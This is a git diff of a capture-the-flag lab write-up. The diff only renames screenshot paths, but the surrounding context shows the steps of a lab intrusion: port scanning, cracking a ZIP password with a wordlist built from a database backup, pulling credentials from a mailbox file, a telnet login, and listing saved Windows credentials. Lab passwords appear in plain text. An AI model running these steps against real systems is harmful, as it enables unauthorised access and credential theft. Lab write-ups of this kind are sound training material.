@@ -4,7 +4,7 @@
 
 ## 1. Nmap
 
-![Nmap Scan](images/01-nmap-scan.png)
+![Nmap Scan](nmap.png)
 
 ```bash
 nmap -p- -sV -sC -v 10.129.29.21 -oN nmap.txt
@@ -43,7 +43,7 @@ The ZIP archive was password protected, so it needed to be cracked. Converted it
 
 ## 4. Wordlist from Database
 
-![MDB Wordlist](images/04-mdb-strings-wordlist.png)
+![MDB Wordlist](mdb-strings-wordlist.png)
 
 ```bash
 strings -n 8 backup.mdb | sort -u > backup_wordlist
@@ -56,7 +56,7 @@ Extracted strings from the database backup to build a custom wordlist. This is m
 
 ## 5. Crack ZIP Password
 
-![John Crack](images/05-john-crack-success.png)
+![John Crack](john-crack-success.png)
 
 ```bash
 john Access_Control.hash --wordlist=backup_wordlist
@@ -73,7 +73,7 @@ access4u@security
 
 ## 6. Extract PST + Find Credentials
 
-![PST Credentials](images/06-pst-read-credentials.png)
+![PST Credentials](pst-read-credentials.png)
 
 ```bash
 unzip "Access Control.zip"
@@ -92,7 +92,7 @@ security : 4Cc3ssC0ntroller.
 
 ## 7. Telnet Access
 
-![Telnet Login](images/07-telnet-login.png)
+![Telnet Login](telnet-login.png)
 
 ```bash
 telnet 10.129.29.21
@@ -105,7 +105,7 @@ Used discovered credentials to gain a shell as the `security` user via Telnet.
 
 ## 8. Check Saved Credentials
 
-![Saved Credentials](images/08-cmdkey-saved-creds.png)
+![Saved Credentials](pst-read-credentials.png)
 
 ```cmd
 cmdkey /list
